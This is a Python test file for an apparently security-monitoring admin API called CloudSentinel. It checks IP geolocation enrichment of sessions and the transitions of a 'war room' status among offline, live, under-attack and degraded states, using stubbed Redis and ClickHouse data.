def test_admin_api_sessions_fallback_enriches_ip(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CLOUDSENTINEL_STRICT_TRUTH", "0")
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.admin.token = SecretStr("test-token")
    pipeline = EventPipeline(settings.redis)

    class SoarStub:
        _mem_ip_sessions = {"8.8.8.8": {"sess-1"}}

        @staticmethod
        def get_ip_profile(_: str) -> dict[str, object]:
            return {"first_seen": time.time() - 30, "cumulative_risk": 70, "techniques": ["T1110"]}

    monkeypatch.setattr("cloudsentinel.admin_api._load_recent_sessions_from_clickhouse", lambda _settings: [])
    monkeypatch.setattr(
        "cloudsentinel.admin_api._enrichment_for_ip",
        lambda _ip, _country_code="", _country_name="": {
            "country_code": "US",
            "country_name": "United States",
            "asn": "15169",
            "isp": "Google",
            "org": "Google LLC",
            "services": "Data Center/Transit",
            "region": "California",
            "city": "Mountain View",
            "latitude": "37.4056",
            "longitude": "-122.0775",
            "timezone": "America/Los_Angeles",
        },
    )
    app = create_admin_app(settings, pipeline, soar=SoarStub())
    client = TestClient(app)

    response = client.get("/sessions", headers={"Authorization": "Bearer test-token"})
    assert response.status_code == 200
    sessions = response.json()["sessions"]
    assert len(sessions) == 1
    assert sessions[0]["countryCode"] == "US"
    assert sessions[0]["isp"] == "Google"
    assert sessions[0]["city"] == "Mountain View"


def test_war_room_state_transitions(monkeypatch: pytest.MonkeyPatch) -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.admin.token = SecretStr("test-token")
    pipeline = EventPipeline(settings.redis)

    class FakeRedis:
        def __init__(self) -> None:
            self.data: dict[str, dict[str, str]] = {}

        async def hgetall(self, key: str) -> dict[str, str]:
            return dict(self.data.get(key, {}))

        async def hset(self, key: str, mapping: dict[str, str]) -> None:
            self.data[key] = {**self.data.get(key, {}), **mapping}

        async def expire(self, key: str, ttl: int) -> None:
            _ = (key, ttl)

    pipeline._redis = FakeRedis()  # type: ignore[attr-defined]

    clock = {"now": 1_000_000}
    evidence = {"last_online_at": 0, "last_attack_at": 0}

    monkeypatch.setattr("cloudsentinel.admin_api._now_ms", lambda: int(clock["now"]))
    monkeypatch.setattr(
        "cloudsentinel.admin_api._load_war_room_evidence_from_clickhouse",
        lambda _settings: {
            "source": "clickhouse",
            "authoritative": True,
            "last_online_at": int(evidence["last_online_at"]),
            "last_attack_at": int(evidence["last_attack_at"]),
        },
    )

    app = create_admin_app(settings, pipeline)
    client = TestClient(app)
    headers = {"Authorization": "Bearer test-token"}

    first = client.get("/war-room-state", headers=headers)
    assert first.status_code == 200
    assert first.json()["state"] == "offline"

    clock["now"] += 3_000
    evidence["last_online_at"] = clock["now"]
    second = client.get("/war-room-state", headers=headers)
    assert second.status_code == 200
    assert second.json()["state"] == "live"

    clock["now"] += 3_000
    evidence["last_attack_at"] = clock["now"]
    third = client.get("/war-room-state", headers=headers)
    assert third.status_code == 200
    assert third.json()["state"] == "under_attack"

    clock["now"] += 95_000
    evidence["last_online_at"] = clock["now"]
    fourth = client.get("/war-room-state", headers=headers)
    assert fourth.status_code == 200
    assert fourth.json()["state"] == "live"

    clock["now"] += 50_000
    fifth = client.get("/war-room-state", headers=headers)
    assert fifth.status_code == 200
    assert fifth.json()["state"] == "offline"


def test_war_room_state_degraded_hold(monkeypatch: pytest.MonkeyPatch) -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.admin.token = SecretStr("test-token")
    pipeline = EventPipeline(settings.redis)

    class FakeRedis:
        def __init__(self) -> None:
            self.data: dict[str, dict[str, str]] = {}

        async def hgetall(self, key: str) -> dict[str, str]:
            return dict(self.data.get(key, {}))

        async def hset(self, key: str, mapping: dict[str, str]) -> None:
            self.data[key] = {**self.data.get(key, {}), **mapping}

        async def expire(self, key: str, ttl: int) -> None:
            _ = (key, ttl)

    pipeline._redis = FakeRedis()  # type: ignore[attr-defined]

    clock = {"now": 2_000_000}
    evidence = {"last_online_at": clock["now"], "last_attack_at": 0}

    monkeypatch.setattr("cloudsentinel.admin_api._now_ms", lambda: int(clock["now"]))
    monkeypatch.setattr(
        "cloudsentinel.admin_api._load_war_room_evidence_from_clickhouse",
        lambda _settings: {
            "source": "clickhouse",
            "authoritative": True,
            "last_online_at": int(evidence["last_online_at"]),
            "last_attack_at": int(evidence["last_attack_at"]),
        },
    )

    app = create_admin_app(settings, pipeline)
    client = TestClient(app)
    headers = {"Authorization": "Bearer test-token"}

    baseline = client.get("/war-room-state", headers=headers)
    assert baseline.status_code == 200
    assert baseline.json()["state"] == "live"
    assert baseline.json()["degraded"] is False

    # Simulate full Redis outage: both pipeline redis handle and direct fallback fail.
    monkeypatch.setattr("redis.asyncio.from_url", lambda *args, **kwargs: (_ for _ in ()).throw(ConnectionError("redis down")))
    pipeline._redis = None  # type: ignore[attr-defined]
    clock["now"] += 5_000
    held = client.get("/war-room-state", headers=headers)
    assert held.status_code == 200
    assert held.json()["state"] == "live"
    assert held.json()["degraded"] is True

    clock["now"] += 70_000
    expired = client.get("/war-room-state", headers=headers)
    assert expired.status_code == 200
    assert expired.json()["state"] == "offline"
    assert expired.json()["degraded"] is True


def test_war_room_state_uses_direct_redis_fallback(monkeypatch: pytest.MonkeyPatch) -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.admin.token = SecretStr("test-token")
    pipeline = EventPipeline(settings.redis)
    pipeline._redis = None  # type: ignore[attr-defined]

    class FakeRedis:
        def __init__(self) -> None:
            self.data: dict[str, dict[str, str]] = {}

        async def ping(self) -> bool:
            return True

        async def hgetall(self, key: str) -> dict[str, str]:
            return dict(self.data.get(key, {}))

        async def hset(self, key: str, mapping: dict[str, str]) -> None:
            self.data[key] = {**self.data.get(key, {}), **mapping}

        async def expire(self, key: str, ttl: int) -> None:
            _ = (key, ttl)

        async def aclose(self) -> None:
            return None

    fake_redis = FakeRedis()
    monkeypatch.setattr("redis.asyncio.from_url", lambda *args, **kwargs: fake_redis)
    monkeypatch.setattr("cloudsentinel.admin_api._now_ms", lambda: 5_010_000)
    monkeypatch.setattr(
        "cloudsentinel.admin_api._load_war_room_evidence_from_clickhouse",
        lambda _settings: {
            "source": "clickhouse",
            "authoritative": True,
            "last_online_at": 5_000_000,
            "last_attack_at": 0,
        },
    )

    app = create_admin_app(settings, pipeline)
    client = TestClient(app)
    headers = {"Authorization": "Bearer test-token"}

    response = client.get("/war-room-state", headers=headers)
    assert response.status_code == 200
    payload = response.json()
    assert payload["state"] == "live"
    assert payload["degraded"] is False
    assert payload["sourceBreakdown"]["storage"] == "redis-direct"
